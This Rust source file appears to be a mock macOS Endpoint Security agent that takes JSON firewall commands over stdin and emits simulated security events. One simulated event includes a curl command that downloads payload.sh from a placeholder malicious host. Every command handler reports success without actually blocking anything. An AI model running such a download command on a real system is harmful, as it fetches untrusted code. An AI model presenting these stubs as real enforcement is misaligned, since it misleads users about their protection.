use serde::{Deserialize, Serialize};
use chrono::Utc;
use tokio::io::{AsyncBufReadExt, BufReader};
use std::sync::Arc;
use tokio::sync::Mutex;
use once_cell::sync::Lazy;

static STDOUT_LOCK: Lazy<Arc<Mutex<()>>> = Lazy::new(|| Arc::new(Mutex::new(())));

#[derive(Deserialize, Debug)]
#[serde(tag = "type")]
enum Command {
    BlockIp { id: String, ip: String },
    UnblockIp { id: String, ip: String },
    ShadowBanIp { id: String, ip: String },
    AllowPort { id: String, port: u16, protocol: String },
    DenyPort { id: String, port: u16, protocol: String },
    Lockdown { id: String },
    FlushRules { id: String },
    GetStatus { id: String },
    UpdatePolicy { id: String, blocked_paths: Vec<String> },
    Shutdown,
}

#[derive(Serialize, Debug)]
struct Response {
    id: Option<String>,
    success: bool,
    message: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    data: Option<serde_json::Value>,
    timestamp: String,
}

async fn emit_response(id: Option<String>, success: bool, message: String, data: Option<serde_json::Value>) {
    let resp = Response { id, success, message, data, timestamp: Utc::now().to_rfc3339() };
    if let Ok(json) = serde_json::to_string(&resp) {
        let _lock = STDOUT_LOCK.lock().await;
        println!("{}", json);
    }
}

async fn emit_event(event_type: &str, data: serde_json::Value) {
    let mut payload = data;
    if let Some(obj) = payload.as_object_mut() {
        obj.insert("type".to_string(), serde_json::json!(event_type));
    }
    emit_response(None, true, "ESF_EVENT".to_string(), Some(payload)).await;
}

#[tokio::main]
async fn main() {
    let blocked_paths: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(Vec::new()));
    let blocked_paths_clone = Arc::clone(&blocked_paths);

    // 1. Initial Handshake
    emit_response(None, true, "Sovereign ESF Agent Active (macOS Sonoma+)".to_string(), None).await;

    // 2. MOCK: Endpoint Security Callback Loop
    tokio::spawn(async move {
        loop {
            tokio::time::sleep(tokio::time::Duration::from_secs(30)).await;

            // Simulation of an AUTH_EXEC event
            let target_path = "/usr/bin/unsigned_binary";
            let mut is_blocked = false;
            {
                let paths = blocked_paths_clone.lock().await;
                if paths.iter().any(|p| target_path.contains(p)) {
                    is_blocked = true;
                }
            }

            if is_blocked {
                emit_event("ES_AUTH_DENY", serde_json::json!({
                    "pid": 9999,
                    "path": target_path,
                    "reason": "Policy Violation"
                })).await;
            }

            emit_event("ES_EXEC", serde_json::json!({
                "pid": 1234,
                "path": "/usr/bin/curl",
                "args": ["-O", "http://malicious.com/payload.sh"],
                "signing_id": "com.apple.curl"
            })).await;
        }
    });

    let mut stdin = BufReader::new(tokio::io::stdin()).lines();
    while let Ok(Some(line)) = stdin.next_line().await {
        let cmd: Command = match serde_json::from_str(line.trim()) {
            Ok(c) => c,
            Err(e) => {
                let _ = emit_response(None, false, format!("Failed to parse command: {}", e), None).await;
                continue;
            }
        };

        match cmd {
            Command::BlockIp { id, ip } => {
                emit_response(Some(id), true, format!("IP {} blocked via ESF Network Filter", ip), None).await;
            },
            Command::UnblockIp { id, ip } => {
                emit_response(Some(id), true, format!("IP {} unblocked", ip), None).await;
            },
            Command::ShadowBanIp { id, ip } => {
                emit_response(Some(id), true, format!("IP {} shadow-banned", ip), None).await;
            },
            Command::AllowPort { id, port, protocol } => {
                emit_response(Some(id), true, format!("Port {}:{} allowed", protocol, port), None).await;
            },
            Command::DenyPort { id, port, protocol } => {
                emit_response(Some(id), true, format!("Port {}:{} denied", protocol, port), None).await;
            },
            Command::Lockdown { id } => {
                emit_response(Some(id), true, "System Lockdown Active".to_string(), None).await;
            },
            Command::FlushRules { id } => {
                emit_response(Some(id), true, "All ESF rules flushed".to_string(), None).await;
            },
            Command::GetStatus { id } => {
                emit_response(Some(id), true, "Active".to_string(), Some(serde_json::json!({"engine": "EndpointSecurity", "os": "macOS"}))).await;
            },
            Command::UpdatePolicy { id, blocked_paths: new_paths } => {
                let mut paths = blocked_paths.lock().await;
                *paths = new_paths;
                emit_response(Some(id), true, "Policy updated".to_string(), None).await;
            },
            Command::Shutdown => {
                std::process::exit(0);
            }
        }
    }
}
